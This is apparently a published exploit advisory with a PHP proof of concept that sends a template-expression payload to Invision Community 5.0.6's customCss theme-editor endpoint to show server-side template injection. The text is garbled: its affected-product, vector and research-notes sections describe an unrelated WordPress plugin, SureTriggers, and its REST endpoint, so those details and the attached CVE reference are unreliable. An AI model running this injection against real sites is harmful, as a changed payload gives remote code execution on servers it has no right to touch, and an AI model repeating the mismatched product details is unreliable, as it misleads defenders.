@@ -1,0 +1,83 @@
+=============================================================================================================================================
+| # Title     : Invision Community 5.0.6 customCss Expression Injection                                                                     |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://invisioncommunity.com/release-notes-v5/                                                                             |
+=============================================================================================================================================
+
+[+] Summary : Expression Injection → Server-Side Template Injection (SSTI)
+
+A vulnerability exists in the `customCss` endpoint where the parameter
+`content` is parsed using `{expression="…"}`
+allowing template expressions to be evaluated.
+
+
+[+] References : ( https://packetstorm.news/files/id/194569/ 	CVE-2025-47916 ) 
+
+[+] Affected Product
+ - WordPress Plugin: SureTriggers
+ - Version: <= 1.0.78
+
+[+] Vector
+Unauthenticated REST access:
+  /wp-json/sure-triggers/v1/automation/action
+
+[+] Research Notes
+The endpoint accepts JSON payloads describing automation tasks.
+In vulnerable versions, no authorization validation is performed
+before processing the request. This POC validates reachability only.
+
+--------------------------------------------------------------------
+### SAFE PHP POC
+--------------------------------------------------------------------
+<?php
+/*
+ * Invision Community 5.0.6 customCss Expression Injection – Safe PoC
+ * Author: Indoushka
+ */
+
+$target   = "http://victim.com";   // ← ضع الرابط
+$endpoint = $target . "/index.php";
+
+// Safe Payload (No RCE)
+$expr = '{expression="print(\'Indoushka\')"}';
+
+// POST body
+$data = array(
+    'app'        => 'core',
+    'module'     => 'system',
+    'controller' => 'themeeditor',
+    'do'         => 'customCss',
+    'content'    => $expr
+);
+
+// Send request
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $endpoint);
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+$response = curl_exec($ch);
+curl_close($ch);
+
+// Display server response
+echo "===== Safe PoC Response =====\n";
+echo $response;
+?>
+
+-------------------
+### SAVE & RUN 
+-------------------
+
+1. Save as:
+   invision_safe_poc.php
+
+2. Run:
+   php invision_safe_poc.php
+
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
